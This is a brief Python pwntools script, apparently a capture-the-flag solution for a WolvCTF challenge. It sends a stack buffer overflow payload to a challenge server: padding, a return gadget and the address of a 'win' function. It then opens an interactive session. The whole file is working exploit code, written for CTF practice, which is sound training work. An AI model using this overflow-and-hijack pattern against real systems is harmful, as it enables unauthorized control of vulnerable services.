from pwn import *

p = process("./challenge")
#gdb.attach(p)
p = remote("cat.wolvctf.io", 1337)

win = 0x4011b6
ret = 0x40101a

payload = b"A"*136 + p64(ret) + p64(win)

p.recvline()
p.recvline()
p.sendline(payload)

p.interactive()